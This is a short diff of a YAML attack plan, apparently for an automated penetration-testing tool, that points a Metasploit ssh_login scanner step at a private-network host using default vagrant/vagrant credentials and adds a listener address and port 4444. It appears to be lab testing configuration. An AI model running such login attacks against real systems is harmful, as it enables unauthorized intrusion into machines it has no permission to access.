@@ -17,9 +17,11 @@ plan:
           create_named_session: session_to_target_1
           exploit: auxiliary/scanner/ssh/ssh_login
           exploit_arguments:
-            RHOSTS: 127.0.0.1
+            RHOSTS: 172.28.128.99
             USERNAME: vagrant
             PASSWORD: vagrant
+            LHOST: 172.28.128.3
+            LPORT: 4444
       next:
         - type: result
           value: OK
